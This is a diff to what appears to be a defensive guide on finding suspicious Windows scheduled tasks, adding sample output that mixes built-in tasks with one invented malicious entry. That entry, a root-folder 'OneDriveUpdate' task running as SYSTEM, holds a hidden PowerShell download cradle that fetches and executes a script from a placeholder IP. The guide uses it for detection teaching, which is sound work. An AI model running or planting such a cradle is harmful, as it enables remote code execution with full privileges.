@@ -126,6 +126,25 @@ Use this list on every OS. One flag is a reason to look; two or more is a reason
     } | Format-List
     ```
 
+    Example output (captured on a clean Windows 11 workstation; the last entry is an invented bad one):
+
+    ```text
+    Task    : \Microsoft\Windows\Application Experience\PcaPatchDbTask
+    RunAs   : SYSTEM
+    Command : %windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask
+
+    Task    : \Microsoft\Windows\ApplicationData\CleanupTemporaryState
+    RunAs   : SYSTEM
+    Command : %windir%\system32\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState
+
+    Task    : \OneDriveUpdate
+    RunAs   : SYSTEM
+    Command : powershell.exe -w hidden -c iex(iwr http://198.51.100.7/u.ps1)
+    ```
+
+    The clean workstation returned 26 hits, almost all built-in `rundll32` tasks under `\Microsoft\Windows\`. A task in
+the root folder, named like a vendor updater, running a download cradle as SYSTEM is the pattern to act on.
+
 === "PowerShell: hidden tasks"
 
     A task whose `SD` (security descriptor) value was deleted from the registry still runs but no longer shows in
